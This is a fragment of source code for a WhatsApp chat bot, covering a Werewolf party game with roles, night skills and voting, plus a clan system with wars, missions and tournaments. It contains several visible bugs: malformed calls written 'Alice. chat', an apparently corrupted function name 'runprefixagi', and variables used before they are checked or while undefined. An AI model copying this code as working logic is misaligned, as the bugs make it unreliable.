        if (chat in ww) return ReplyRynzz("Group masih dalam sesi permainan");
        if (playerOnGame(sender, ww) === true)
            return ReplyRynzz("Kamu masih dalam sesi game");
        ww[chat] = {
            room: chat,
            owner: sender,
            status: false,
            iswin: null,
            cooldown: null,
            day: 0,
            time: "malem",
            player: [],
            dead: [],
            voting: false,
            seer: false,
            guardian: [],
        };
        await ReplyRynzz("Room berhasil dibuat, ketik *.ww join* untuk bergabung");

        // [ Join sesi permainan ]
    } else if (value === "join") {
        if (!ww[chat]) return ReplyRynzz("Belum ada sesi permainan");
        if (ww[chat].status === true)
            return ReplyRynzz("Sesi permainan sudah dimulai");
        if (ww[chat].player.length > 16)
            return ReplyRynzz("Maaf jumlah player telah penuh");
        if (playerOnRoom(sender, chat, ww) === true)
            return ReplyRynzz("Kamu sudah join dalam room ini");
        if (playerOnGame(sender, ww) === true)
            return ReplyRynzz("Kamu masih dalam sesi game");
        let data = {
            id: sender,
            number: ww[chat].player.length + 1,
            sesi: chat,
            status: false,
            role: false,
            effect: [],
            vote: 0,
            isdead: false,
            isvote: false,
        };
        ww[chat].player.push(data);
        let player = [];
        let text = `\n*⌂ W E R E W O L F - P L A Y E R*\n\n`;
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )}\n`;
            player.push(ww[chat].player[i].id);
        }
        text += "\nJumlah player minimal adalah 5 dan maximal 15";
        Alice.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: xtele,
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );

        // [ Game Play ]
    } else if (value === "start") {
        if (!ww[chat]) return ReplyRynzz("Belum ada sesi permainan");
        if (ww[chat].player.length === 0)
            return ReplyRynzz("Room belum memiliki player");
        if (ww[chat].player.length < 5)
            return ReplyRynzz("Maaf jumlah player belum memenuhi syarat");
        if (playerOnRoom(sender, chat, ww) === false)
            return ReplyRynzz("Kamu belum join dalam room ini");
        if (ww[chat].cooldown > 0) {
            if (ww[chat].time === "voting") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_vote(Alice. chat, ww);
            } else if (ww[chat].time === "malem") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_malam(Alice. chat, ww);
            } else if (ww[chat].time === "pagi") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await runprefixagi(Alice. chat, ww);
            }
        }
        if (ww[chat].status === true)
            return ReplyRynzz("Sesi permainan telah dimulai");
        if (ww[chat].owner !== sender)
            return ReplyRynzz(
                `Hanya @${ww[chat].owner.split("@")[0]} yang dapat memulai permainan`
            );
        let list1 = "";
        let list2 = "";
        let player = [];
        roleGenerator(chat, ww);
        addTimer(chat, ww);
        startGame(chat, ww);
        for (let i = 0; i < ww[chat].player.length; i++) {
            list1 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")}\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            list2 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")} ${
          ww[chat].player[i].role === "werewolf" ||
          ww[chat].player[i].role === "sorcerer"
            ? `[${ww[chat].player[i].role}]`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            // [ Werewolf ]
            if (ww[chat].player[i].role === "werewolf") {
                if (ww[chat].player[i].isdead != true) {
                    var textt = `Hai ${Alice.getName(
              ww[chat].player[i].id
            )}, Kamu telah dipilih untuk memerankan *Werewolf* ${emoji_role(
              "werewolf"
            )} pada permainan kali ini, silahkan pilih salah satu player yang ingin kamu makan pada malam hari ini\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc kill nomor* untuk membunuh player`;
                    await Alice.sendMessage(ww[chat].player[i].id, {
                        text: textt,
                        mentions: player,
                    });
                }
                        // [ villager ]
            } else if (ww[chat].player[i].role === "warga") {
                if (ww[chat].player[i].isdead != true) {
                    let texttt = `*⌂ W E R E W O L F - G A M E*\n\nHai ${Alice.getName(
              ww[chat].player[i].id
            )} Peran kamu adalah *Warga Desa* ${emoji_role(
              "warga"
            )}, tetap waspada, mungkin *Werewolf* akan memakanmu malam ini, silakan masuk kerumah masing masing.\n*LIST PLAYER*:\n${list1}`;
                    await Alice.sendMessage(ww[chat].player[i].id, {
                        text: texttt,
                        mentions: player,
                    });
                }

                // [ Penerawangan ]
            } else if (ww[chat].player[i].role === "seer") {
                if (ww[chat].player[i].isdead != true) {
                    let texxt = `Hai ${Alice.getName(
              ww[chat].player[i].id
            )} Kamu telah terpilih  untuk menjadi *Penerawang* ${emoji_role(
              "seer"
            )}. Dengan sihir yang kamu punya, kamu bisa mengetahui peran pemain pilihanmu.\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc dreamy nomor* untuk melihat role player`;

                    await Alice.sendMessage(ww[chat].player[i].id, {
                        text: texxt,
                        mentions: player,
                    });
                }

                // [ Guardian ]
            } else if (ww[chat].player[i].role === "guardian") {
                if (ww[chat].player[i].isdead != true) {
                    let teext = `Hai ${Alice.getName(
              ww[chat].player[i].id
            )} Kamu terpilih untuk memerankan *Malaikat Pelindung* ${emoji_role(
              "guardian"
            )}, dengan kekuatan yang kamu miliki, kamu bisa melindungi para warga, silahkan pilih salah 1 player yang ingin kamu lindungi\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc deff nomor* untuk melindungi player`;
  
                    await Alice.sendMessage(ww[chat].player[i].id, {
                        text: teext,
                        mentions: player,
                    });
                }

                // [ Sorcerer ]
            } else if (ww[chat].player[i].role === "sorcerer") {
                if (ww[chat].player[i].isdead != true) {
                    let textu = `Hai ${Alice.getName(
              ww[chat].player[i].id
            )} Kamu terpilih sebagai Penyihir ${emoji_role(
              "sorcerer"
            )}, dengan kekuasaan yang kamu punya, kamu bisa membuka identitas para player, silakan pilih 1 orang yang ingin kamu buka identitasnya\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc sorcerer nomor* untuk melihat role player`;

                    await Alice.sendMessage(ww[chat].player[i].id, {
                        text: textu,
                        mentions: player,
                    });
                }
            }
        }
        await Alice.sendMessage(m.chat, {
            text: "*⌂ W E R E W O L F - G A M E*\n\nGame telah dimulai, para player akan memerankan perannya masing masing, silahkan cek chat pribadi untuk melihat role kalian. Berhati-hatilah para warga, mungkin malam ini adalah malah terakhir untukmu",
            contextInfo: {
                externalAdReply: {
                    title: "W E R E W O L F",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnail: await resize(thumb, 300, 175),
                    sourceUrl: xtele,
                    mediaUrl: thumb,
                },
                mentionedJid: player,
            },
        });
        await run(Alice. chat, ww);
    } else      if (value === "kill") { 
    let byId = getPlayerById2(sender, parseInt(target), ww)
         if (dataPlayer(sender, ww).role !== "werewolf") 
             return ReplyRynzz("Peran ini bukan untuk kamu"); 
         if (byId.db.role === "sorcerer") 
             return ReplyRynzz("Tidak bisa menggunakan skill untuk teman"); 
                  if (playerOnGame(sender, ww) === false)
        return ReplyRynzz("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return ReplyRynzz("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return ReplyRynzz("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return ReplyRynzz(`Masukan nomor player \nContoh : \n${XyrooRynzz} kill 1`)
    if (isNaN(target)) 
        return ReplyRynzz("Gunakan hanya nomor")    
    if (byId.db.isdead === true) 
        return ReplyRynzz("Player sudah mati")
    if (byId.db.id === sender)
        return ReplyRynzz("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return ReplyRynzz("Player tidak terdaftar")
      ReplyRynzz("Berhasil membunuh player " + parseInt(target)) 
             .then(() => { 
                 dataPlayer(sender, ww).status = true; 
                 killWerewolf(sender, parseInt(target), ww); 
             }); 
     } else if (value === "dreamy") { 
         if (dataPlayer(sender, ww).role !== "seer") 
             return ReplyRynzz("Peran ini bukan untuk kamu"); 
                  if (playerOnGame(sender, ww) === false)
        return ReplyRynzz("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return ReplyRynzz("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return ReplyRynzz("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return ReplyRynzz(`Masukan nomor player \nContoh : \n${XyrooRynzz} kill 1`)
    if (isNaN(target)) 
        return ReplyRynzz("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return ReplyRynzz("Player sudah mati")
    if (byId.db.id === sender)
        return ReplyRynzz("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return ReplyRynzz("Player tidak terdaftar")
         let dreamy = dreamySeer(m.sender, parseInt(target), ww); 
         ReplyRynzz(`Berhasil membuka identitas player ${target} adalah ${dreamy}`) 
             .then(() => { 
                 dataPlayer(sender, ww).status = true; 
             }); 
     } else if (value === "deff") { 
         if (dataPlayer(sender, ww).role !== "guardian") 
             return ReplyRynzz("Peran ini bukan untuk kamu"); 
                  if (playerOnGame(sender, ww) === false)
        return ReplyRynzz("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return ReplyRynzz("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return ReplyRynzz("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return ReplyRynzz(`Masukan nomor player \nContoh : \n${XyrooRynzz} kill 1`)
    if (isNaN(target)) 
        return ReplyRynzz("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return ReplyRynzz("Player sudah mati")
    if (byId.db.id === sender)
        return ReplyRynzz("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return ReplyRynzz("Player tidak terdaftar")
         ReplyRynzz(`Berhasil melindungi player ${target}`).then(() => { 
             protectGuardian(m.sender, parseInt(target), ww); 
             dataPlayer(sender, ww).status = true; 
         }); 
     } else if (value === "sorcerer") { 
         if (dataPlayer(sender, ww).role !== "sorcerer") 
             return ReplyRynzz("Peran ini bukan untuk kamu"); 
             if (playerOnGame(sender, ww) === false)
        return ReplyRynzz("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return ReplyRynzz("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return ReplyRynzz("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return ReplyRynzz(`Masukan nomor player \nContoh : \n${XyrooRynzz} kill 1`)
    if (isNaN(target)) 
        return ReplyRynzz("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return ReplyRynzz("Player sudah mati")
    if (byId.db.id === sender)
        return ReplyRynzz("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return ReplyRynzz("Player tidak terdaftar")
         let sorker = sorcerer(sesi(m.sender), target); 
          ReplyRynzz(`Berhasil membuka identitas player ${player} adalah ${sorker}`) 
             .then(() => { 
                 dataPlayer(sender, ww).status = true; 
             }); 
     } else if (value === "vote") {
        if (!ww[chat]) return ReplyRynzz("Belum ada sesi permainan");
        if (ww[chat].status === false)
            return ReplyRynzz("Sesi permainan belum dimulai");
        if (ww[chat].time !== "voting")
            return ReplyRynzz("Sesi voting belum dimulai");
        if (playerOnRoom(sender, chat, ww) === false)
            return ReplyRynzz("Kamu bukan player");
        if (dataPlayer(sender, ww).isdead === true)
            return ReplyRynzz("Kamu sudah mati");
        if (!target || target.length < 1)
            return ReplyRynzz("Masukan nomor player");
        if (isNaN(target)) return ReplyRynzz("Gunakan hanya nomor");
        if (dataPlayer(sender, ww).isvote === true)
            return ReplyRynzz("Kamu sudah melakukan voting");
        b = getPlayerById(chat, sender, parseInt(target), ww);
        if (b.db.isdead === true)
            return ReplyRynzz(`Player ${target} sudah mati.`);
        if (ww[chat].player.length < parseInt(target))
            return ReplyRynzz("Invalid");
        if (getPlayerById(chat, sender, parseInt(target), ww) === false)
            return ReplyRynzz("Player tidak terdaftar!");
        vote(chat, parseInt(target), sender, ww);
        return ReplyRynzz("✅ Vote");
    } else if (value == "exit") {
        if (!ww[chat]) return ReplyRynzz("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return ReplyRynzz("Kamu tidak dalam sesi permainan");
        if (ww[chat].status === true)
            return ReplyRynzz("Permainan sudah dimulai, kamu tidak bisa keluar");
        let exitww = `${sender.split("@")[0]} Keluar dari permainan`
                Alice.sendMessage(
            m.chat, {
                text: exitww,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: xtele,
                        mediaUrl: thumb,
                    },
                    mentionedJid: sender,
                },
            }, {
                quoted: m
            }
        );  
        playerExit(chat, sender, ww);
    } else if (value === "delete") {
        if (!ww[chat]) return ReplyRynzz("Tidak ada sesi permainan");
        if (ww[chat].owner !== sender)
            return ReplyRynzz(
                `Hanya @${
            ww[chat].owner.split("@")[0]
          } yang dapat menghapus sesi permainan ini`
            );
        ReplyRynzz("Sesi permainan berhasil dihapus").then(() => {
            delete ww[chat];
        });
    } else if (value === "player") {
        if (!ww[chat]) return ReplyRynzz("Tidak ada sesi permainan");
        if (playerOnRoom(sender, chat, ww) === false)
            return ReplyRynzz("Kamu tidak dalam sesi permainan");
        if (ww[chat].player.length === 0)
            return ReplyRynzz("Sesi permainan belum memiliki player");
        let player = [];
        let text = "\n*⌂ W E R E W O L F - G A M E*\n\nLIST PLAYER:\n";
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `(${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )} ${
          ww[chat].player[i].isdead === true
            ? `☠️ ${ww[chat].player[i].role}`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        Alice.sendMessage(
            m.chat, {
                text: text,
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: xtele,
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );
    } else {
    let text = `\n*⌂ W E R E W O L F - G A M E*\n\nPermainan Sosial Yang Berlangsung Dalam Beberapa Putaran/ronde. Para Pemain Dituntut Untuk Mencari Seorang Penjahat Yang Ada Dipermainan. Para Pemain Diberi Waktu, Peran, Serta Kemampuannya Masing-masing Untuk Bermain Permainan Ini\n\n*⌂ C O M M A N D*\n`;
        text += ` • ww create\n`;
        text += ` • ww join\n`;
        text += ` • ww start\n`;
        text += ` • ww exit\n`;
        text += ` • ww delete\n`;
        text += ` • ww player\n`;
        text += `\nPermainan ini dapat dimainkan oleh 5 sampai 15 orang.`;
        Alice.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: xtele,
                        mediaUrl: thumb,
                    },
                },
            }, {
                quoted: m
            }
        );
    }
}
break

case "clan":
  case "clans":
    {
if (isBan) return Xban()
await xreaction()
      if (!m.isGroup) return Xgroup();
      let jimp = require("jimp");
      const resizeImage = async (image, width, height) => {
        const readImage = await jimp.read(image);
        const resizedImage = await readImage
          .resize(width, height)
          .getBufferAsync(jimp.MIME_JPEG);
        return resizedImage;
      };

      let thumbUrl = "https://telegra.ph/file/048d31385faac531d20c6.jpg";
      const {
        playerOnClan,
        readClans,
        writeClans,
        setMissions,
        upgradeMissonProgress,
        updateClanTaskProgress,
        upgradeClanLevel,
        simulateWinner,
        getClanData,
        saveClanData,
        saveTournamentData,
      } = require("./AliceSystem/AliceDatabase/Game/clan");

      async function startNextMatch(tournament) {
        let nextMatch = tournament.matches.find(
          (match) => match.status === "pending",
        );
        if (!nextMatch) {
          tournament.status = "completed";
          clans.currentTournament = null;

          let winnerClan = tournament.participants[0];
          let winningClanData = await getClanData(winnerClan);

          winningClanData.power += 1000;
          winningClanData.level += 5;

          saveClanData(winnerClan, winningClanData);

          await ReplyRynzz(
            `The tournament ${tournament.name} is over! The winner is ${winnerClan}. This clan receives 1000 power and advances 5 levels.`,
          );
          return;
        }

        let clan1Data = await getClanData(nextMatch.clan1);
        let clan2Data = await getClanData(nextMatch.clan2);

        nextMatch.status = "ongoing";
        writeClans(clans);

        let winner = simulateWinner(clan1Data, clan2Data);
        nextMatch.winner = winner;
        nextMatch.status = "completed";

        tournament.participants = tournament.participants.filter(
          (clan) =>
            clan !==
            (winner === clan1Data.clan ? clan2Data.clan : clan1Data.clan),
        );

        writeClans(clans);

        await ReplyRynzz(
          `The match between ${clan1Data.clan} and ${clan2Data.clan} is over! The winner is ${winner}.`,
        );

        setTimeout(() => startNextMatch(tournament), 5000);
      }

      const { sender, chat } = m;
      const clans = readClans();
      const clanData = clans[chat];
      const action = args[0];
      const param1 = args[1];
      const param2 = args[2];

      switch (action) {
        case "create":
          let existingUserClan = Object.values(clans).find(
            (c) => c.owner === sender.replace("@s.whatsapp.net", ""),
          );
          if (existingUserClan) return ReplyRynzz("You already have a clan.");
          let createText = `*Hooray, Clan created successfully*`;
          clans[param1.toLowerCase()] = {
            room: param1,
            owner: sender.replace("@s.whatsapp.net", ""),
            status: false,
            clan: param1,
            members: [],
            joinRequests: [],
            level: 1,
            warLimit: 5,
            currentWarCount: 0,
            missions: {
              daily: {
                description: "Recruit 5 new members",
                progress: 0,
                target: 5,
                reward: 100,
              },
              weekly: {
                description: "Win 3 wars",
                progress: 0,
                target: 3,
                reward: 500,
              },
            },
            clanTasks: {
              description: "Reach level 3",
              progress: 1,
              target: 3,
              reward: 300,
            },
          };
          createText += `\n\nTo join clans, please type .clan join your clan name.`;
          writeClans(clans);
          await ReplyRynzz(createText.trim());
          break;

        case "join":
if (isBan) return Xban()
await xreaction()
          if (!param1)
            return ReplyRynzz(
              "Please enter the name of the clan you want to join.",
            );

          let userClanCheck = Object.values(clans).find(
            (c) => c.members && c.members.some((m) => m.id === sender),
          );
          if (userClanCheck)
            return ReplyRynzz("You are already part of another clan.");

          let targetJoinClan = Object.values(clans).find(
            (c) => c.clan.toLowerCase() === param1.toLowerCase(),
          );
          if (!targetJoinClan)
            return ReplyRynzz("The clan you want to join was not found.");
          if (playerOnClan(sender, chat, clans) === true)
            return ReplyRynzz("You are already part of this clan.");

          let joinData = {
            id: sender,
            number: targetJoinClan.members
              ? targetJoinClan.members.length + 1
              : 1,
            session: chat,
            status: false,
            clan: param1,
            vote: 0,
            isVote: false,
          };

          if (!targetJoinClan.joinRequests) {
            targetJoinClan.joinRequests = [];
          }

          targetJoinClan.joinRequests.push(joinData);
          writeClans(clans);

          let joinText = `Join request has been sent to clan ${targetJoinClan.clan}. Await approval from the clan leader.`;
          ReplyRynzz(joinText);
          break;

        case "approve":
if (isBan) return Xban()
await xreaction()
          if (!param1)
            return ReplyRynzz(
              "Please enter the name of the clan you want to view.",
            );
          let approveClan = Object.values(clans).find(
            (c) => c.clan.toLowerCase() === param1.toLowerCase(),
          );
          if (!approveClan) return ReplyRynzz("Clan not found.");

          if (approveClan.owner !== sender.replace("@s.whatsapp.net", ""))
            return ReplyRynzz(
              "You do not have permission to approve join requests.",
            );

          if (
            !approveClan.joinRequests ||
            approveClan.joinRequests.length === 0
          )
            return ReplyRynzz(
              "There are no join requests pending approval.",
            );

              let approveText = "";

              if (param2 === "all") {
                let approvedMembers = [];
                approveClan.joinRequests.forEach((request) => {
                  targetJoinClan.members.push({
                    id: request.id,
                    number: approveClan.members.length + 1,
                    sesi: chat,
                    status: false,
                    clan: request.clan,
                    vote: 0,
                  });
                  approvedMembers.push(request.id);
approveText += `Join request from @${request.id.replace("@s.whatsapp.net", "")} has been approved.\n`;
});
approveClan.joinRequests = [];
writeClans(clans);
} else if (param2) {
  let index = parseInt(param2) - 1;
  if (
    isNaN(index) ||
    index < 0 ||
    index >= approveClan.joinRequests.length
  )
    return ReplyRynzz("Invalid index number.");

  let requester = approveClan.joinRequests[index];
  approveClan.joinRequests.splice(index, 1);
  approveClan.members.push({
    id: requester.id,
    number: approveClan.members.length + 1,
    session: chat,
    status: false,
    clan: requester.clan,
    vote: 0,
  });
  approveText = `Join request from @${requester.id.replace("@s.whatsapp.net", "")} has been approved.`;
  writeClans(clans);
} else {
  let pendingRequestsText = `Please specify whether you want to approve all join requests (all) or a specific user's request.\n\n`;
  pendingRequestsText += "*List of Join Requests:*\n";
  approveClan.joinRequests.forEach((request, index) => {
    pendingRequestsText += `${index + 1}. @${request.id.replace("@s.whatsapp.net", "")}\n`;
  });

  pendingRequestsText +=
    "\nTo approve a specific request, use the command '.clan approve [index number]'";
  return ReplyRynzz(pendingRequestsText.trim());
}

await ReplyRynzz(approveText);
break;

case "war":
if (isBan) return Xban()
await xreaction()
  let warInitiatorClan = Object.values(clans).find(
    (c) => c.owner === sender.replace("@s.whatsapp.net", ""),
  );
  if (!warInitiatorClan)
    return ReplyRynzz("You do not have a clan to start a war.");

  if (warInitiatorClan.currentWarCount >= warInitiatorClan.warLimit)
    return ReplyRynzz(
      `Your daily war limit has been reached (${warInitiatorClan.currentWarCount}/${warInitiatorClan.warLimit}).`,
    );

  let warTargetClan = Object.values(clans).filter(
    (c) => c.clan !== warInitiatorClan.clan,
  );
  if (warTargetClan.length === 0)
    return ReplyRynzz(
      "No other clans found for war.",
    );

  warTargetClan =
    warTargetClan[Math.floor(Math.random() * warTargetClan.length)];

  if (warInitiatorClan.war || warTargetClan.war)
    return ReplyRynzz(
      "One or both clans are currently in a state of war.",
    );

  let initiatorPower =
    warInitiatorClan.level * warInitiatorClan.members.length;
  let targetPower =
    warTargetClan.level * warTargetClan.members.length;
  let winnerClan =
    initiatorPower >= targetPower
      ? warInitiatorClan
      : warTargetClan;
  let loserClan =
    initiatorPower < targetPower ? warInitiatorClan : warTargetClan;
  let warReward = Math.floor(Math.random() * 3) + 1;

  winnerClan.level += 1; 
  winnerClan.warLimit += warReward;
  winnerClan.currentWarCount += 1;
  loserClan.currentWarCount += 1;

  if (winnerClan.missions && winnerClan.missions.daily) {
    if (
      winnerClan.missions.daily.description.includes("Reach level")
    ) {
      winnerClan.missions.daily.progress = winnerClan.level;
      if (
        winnerClan.missions.daily.progress >=
        winnerClan.missions.daily.target
      ) {
        winnerClan.warLimit += winnerClan.missions.daily.reward;
        winnerClan.missions.daily.completed = true;
      }
    }
  }

  if (winnerClan.missions && winnerClan.missions.weekly) {
    if (
      winnerClan.missions.weekly.description.includes("Reach level")
    ) {
      winnerClan.missions.weekly.progress = winnerClan.level;
      if (
        winnerClan.missions.weekly.progress >=
        winnerClan.missions.weekly.target
      ) {
        winnerClan.warLimit += winnerClan.missions.weekly.reward;
        winnerClan.missions.weekly.completed = true;
      }
    }
  }

  let warResultText = `*War Result:*\n\n`;
  warResultText += `Winner: ${winnerClan.clan} (Level ${winnerClan.level})\n`;
  warResultText += `Loser: ${loserClan.clan} (Level ${loserClan.level})\n`;
  warResultText += `Clan ${winnerClan.clan} receives an additional war limit reward of ${warReward}.\n\n`;
  warResultText += `Daily war count for ${warInitiatorClan.clan}: ${warInitiatorClan.currentWarCount}/${warInitiatorClan.warLimit}`;
  writeClans(clans);
  await ReplyRynzz(warResultText.trim());
  break;

case "list":
if (isBan) return Xban()
await xreaction()
  let listText = `*List of Clans:*\n\n`;
  for (let clanKey in clans) {
    if (
      clanKey === "tournaments" ||
      clanKey === "currentTournament"
    )
      continue;

    let clan = clans[clanKey];
    if (clan && clan.members) {
      let warLimitDisplay =
        clan.warLimit !== null && clan.warLimit !== undefined
          ? clan.warLimit
          : 3;
      listText += `Clan Name: ${clan.clan}\n`;
      listText += `Level: ${clan.level}\n`;
      listText += `Number of Members: ${clan.members.length}\n`;
      listText += `Daily War Limit: ${clan.currentWarCount}/${warLimitDisplay}\n\n`;
    }
  }
  await ReplyRynzz(listText.trim());
  break;

case "leave":
if (isBan) return Xban()
await xreaction()
  let userClan = Object.values(clans).find(
    (c) => c.members && c.members.some((m) => m.id === sender),
  );
  if (!userClan)
    return ReplyRynzz("You are not part of any clan.");

  userClan.members = userClan.members.filter(
    (m) => m.id !== sender,
  );
  writeClans(clans);
  await ReplyRynzz(`You have left the clan ${userClan.clan}.`);
  break;

case "delete":
  let deleteClan = Object.values(clans).find(
    (c) => c.owner === sender.replace("@s.whatsapp.net", ""),
  );
  if (!deleteClan)
    return ReplyRynzz("You do not have a clan to delete.");

  delete clans[deleteClan.clan.toLowerCase()];
  writeClans(clans);
  await ReplyRynzz(`Clan ${deleteClan.clan} has been deleted.`);
  break;

case "member":
if (isBan) return Xban()
await xreaction()
  let targetClanMember = Object.values(clans).find(
    (c) => c.clan.toLowerCase() === param1.toLowerCase(),
  );
  if (!targetClanMember)
    return ReplyRynzz("The clan you are looking for was not found.");

  let memberText = `*List of Members in Clan ${targetClanMember.clan}:*\n\n`;
  targetClanMember.members.forEach((member, index) => {
    memberText += `${index + 1}. @${member.id.replace("@s.whatsapp.net", "")}\n`;
  });
  await ReplyRynzz(memberText.trim());
  break;

case "missions":
if (isBan) return Xban()
await xreaction()
  let missionsClan = Object.values(clans).find(
    (c) => c.owner === sender.replace("@s.whatsapp.net", ""),
  );
  if (!missionsClan)
    return ReplyRynzz("You do not have a clan to view missions.");

  let missionsText = `*Clan ${missionsClan.clan} Missions:*\n\n`;
  if (missionsClan.missions && missionsClan.missions.daily) {
    missionsText += `Daily Mission: ${missionsClan.missions.daily.description}\n`;
    missionsText += `Progress: ${missionsClan.missions.daily.progress}/${missionsClan.missions.daily.target}\n`;
    missionsText += `Reward: ${missionsClan.missions.daily.reward}\n\n`;
  }
  if (missionsClan.missions && missionsClan.missions.weekly) {
    missionsText += `Weekly Mission: ${missionsClan.missions.weekly.description}\n`;
    missionsText += `Progress: ${missionsClan.missions.weekly.progress}/${missionsClan.missions.weekly.target}\n`;
    missionsText += `Reward: ${missionsClan.missions.weekly.reward}\n\n`;
  }
  await ReplyRynzz(missionsText.trim());
  break;

case "task":
if (isBan) return Xban()
await xreaction()
  let taskClan = Object.values(clans).find(
    (c) => c.owner === sender.replace("@s.whatsapp.net", ""),
  );
  if (!taskClan)
    return ReplyRynzz("You do not have a clan to view tasks.");

  let taskText = `*Clan ${taskClan.clan} Tasks:*\n\n`;
  if (taskClan.clanTasks) {
    taskText += `Task Description: ${taskClan.clanTasks.description}\n`;
    taskText += `Progress: ${taskClan.clanTasks.progress}/${taskClan.clanTasks.target}\n`;
    taskText += `Reward: ${taskClan.clanTasks.reward}\n`;
  } else {
taskText += "No tasks currently.";
}
await ReplyRynzz(taskText.trim());
break;

case "upgrade":
if (isBan) return Xban()
await xreaction()
  let upgradeClan = Object.values(clans).find(
    (c) => c.owner === sender.replace("@s.whatsapp.net", ""),
  );
  if (!upgradeClan)
    return ReplyRynzz(
      "You do not have a clan to upgrade.",
    );

  let upgradeCost = upgradeClan.level * 1000; // *☘️ Example :* upgrade cost based on clan level
  if (upgradeClan.level < upgradeClan.clanTasks.target) {
    upgradeClan.level += 1;
    upgradeClan.clanTasks.progress += 1;
    writeClans(clans);
    await ReplyRynzz(
      `Clan ${upgradeClan.clan} has been successfully upgraded to level ${upgradeClan.level}.`,
    );
  } else {
    await ReplyRynzz(
      "Your clan has already reached the maximum level for the current task.",
    );
  }
  break;

case "tournament":
if (isBan) return Xban()
await xreaction()
  const subAction = param1;

  switch (subAction) {
    case "create":
      if (!param2)
        return ReplyRynzz(
          "Please enter the name of the tournament you want to create.",
        );

      let tournamentName = param2;
      if (!clans.tournaments) {
        clans.tournaments = {};
      }

      if (clans.currentTournament)
        return ReplyRynzz(
          "A tournament is currently ongoing. Please wait until the current tournament is over.",
        );

      if (clans.tournaments[tournamentName])
        return ReplyRynzz("A tournament with that name already exists.");

      clans.currentTournament = tournamentName;

      clans.tournaments[tournamentName] = {
        name: tournamentName,
        participants: [],
        status: "pending",
        matches: [],
      };

      writeClans(clans);
      await ReplyRynzz(`Tournament ${tournamentName} has been successfully created.`);
      break;

    case "join":
if (isBan) return Xban()
await xreaction()
      let currentTournamentName = clans.currentTournament;
      if (!currentTournamentName)
        return ReplyRynzz("No tournament is currently ongoing.");

      let joinTournament = clans.tournaments[currentTournamentName];

      let joinUserClan = Object.values(clans).find(
        (c) => c.owner === sender.replace("@s.whatsapp.net", ""),
      );
      if (!joinUserClan)
        return ReplyRynzz(
          "You do not have a clan to join the tournament.",
        );

      if (joinTournament.participants.includes(joinUserClan.clan))
        return ReplyRynzz("Your clan is already registered for this tournament.");

      joinTournament.participants.push(joinUserClan.clan);
      writeClans(clans);
      await ReplyRynzz(
        `Clan ${joinUserClan.clan} has been successfully registered for the ${currentTournamentName} tournament.`,
      );
      break;

    case "start":
if (isBan) return Xban()
await xreaction()
      let startTournamentName = clans.currentTournament;
      if (!startTournamentName)
        return ReplyRynzz("No tournament is currently ongoing.");

